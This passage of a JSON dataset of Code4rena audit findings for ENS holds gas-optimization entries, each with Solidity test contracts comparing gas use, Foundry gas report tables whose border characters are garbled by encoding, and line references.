â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 54823              â”† 232             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ assemblyUpdateOwnerâ”† 5236            â”† 5236 â”† 5236   â”† 5236 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n```\n\n### Lines\n\n*   Owned.sol:15\n\n*   Owned.sol:19\n\n*   ETHRegistrarController.sol:61\n\n*   ETHRegistrarController.sol:62\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-06-use-assembly-to-write-storage-values",
      "tags": [],
      "finders": []
    },
    {
      "id": "5564",
      "title": "[G-05] Use multiple require() statements instead of require(expression && expression && ...)",
      "impact": "GAS",
      "content": "\nYou can save gas by breaking up a require statement with multiple conditions, into multiple require statements with a single condition.\n\n```js\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n    }\n\n    function testGas() public {\n        c0.singleRequire(3);\n        c1.multipleRequire(3);\n    }\n}\n\ncontract Contract0 {\n    function singleRequire(uint256 num) public {\n        require(num > 1 && num < 10 && num == 3);\n    }\n}\n\ncontract Contract1 {\n    function multipleRequire(uint256 num) public {\n        require(num > 1);\n        require(num < 10);\n        require(num == 3);\n    }\n}\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 35487              â”† 208             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ singleRequire      â”† 286             â”† 286 â”† 286    â”† 286 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 35887              â”† 210             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ multipleRequire    â”† 270             â”† 270 â”† 270    â”† 270 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n\n```\n\n### Lines\n\n*   BytesUtils.sol:268\n\n*   ERC1155Fuse.sol:216\n\n*   ERC1155Fuse.sol:291\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-05-use-multiple-require-statements-instead-of-requireexpression--expression--",
      "tags": [],
      "finders": []
    },
    {
      "id": "5563",
      "title": "[G-04] Use `calldata` instead of `memory` for function arguments that do not get mutated.",
      "impact": "GAS",
      "content": "\nMark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.\n\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n    Contract2 c2;\n    Contract3 c3;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n        c2 = new Contract2();\n        c3 = new Contract3();\n    }\n\n    function testGas() public {\n        uint256[] memory arr = new uint256[](10);\n        c0.calldataArray(arr);\n        c1.memoryArray(arr);\n\n        bytes memory data = abi.encode(\"someText\");\n        c2.calldataBytes(data);\n        c3.memoryBytes(data);\n    }\n}\n\ncontract Contract0 {\n    function calldataArray(uint256[] calldata arr) public {\n        uint256 j;\n        for (uint256 i; i < arr.length; i++) {\n            j = arr[i] + 10;\n        }\n    }\n}\n\ncontract Contract1 {\n    function memoryArray(uint256[] memory arr) public {\n        uint256 j;\n        for (uint256 i; i < arr.length; i++) {\n            j = arr[i] + 10;\n        }\n    }\n}\n\ncontract Contract2 {\n    function calldataBytes(bytes calldata data) public {\n        bytes32 val;\n        for (uint256 i; i < 10; i++) {\n            val = keccak256(abi.encode(data, i));\n        }\n    }\n}\n\ncontract Contract3 {\n    function memoryBytes(bytes memory data) public {\n        bytes32 val;\n        for (uint256 i; i < 10; i++) {\n            val = keccak256(abi.encode(data, i));\n        }\n    }\n}\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract0 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 97947                                     â”† 521             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ calldataArray                             â”† 2824            â”† 2824 â”† 2824   â”† 2824 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract1 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 128171                                    â”† 672             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ memoryArray                               â”† 3755            â”† 3755 â”† 3755   â”† 3755 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract2 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 100547                                    â”† 534             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ calldataBytes                             â”† 4934            â”† 4934 â”† 4934   â”† 4934 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract3 contract â”†                 â”†      â”†        â”†      â”†         